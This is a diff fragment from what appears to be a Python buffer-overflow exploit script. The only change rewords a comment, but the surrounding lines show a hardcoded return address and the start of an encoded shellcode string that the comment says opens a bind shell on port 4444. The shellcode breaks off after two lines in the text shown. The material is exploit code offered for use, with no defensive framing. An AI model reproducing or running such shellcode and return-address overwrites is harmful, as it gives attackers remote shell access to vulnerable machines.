@@ -4,7 +4,7 @@ import socket
 #return address = x311712f3
 retaddr = "\xf3\x12\x17\x31"
 
-#following is a bind shell at port 4444, replace it with your shellcode if you want
+#following shellcode is a bind shell at port 4444, replace it with your shellcode if you want
 
 shellcode = ("\xd9\xee\xbb\x0c\x3d\x0c\xb3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
 "\x14\x83\xea\xfc\x31\x5a\x15\x03\x5a\x15\xee\xc8\x3d\x68\x19"
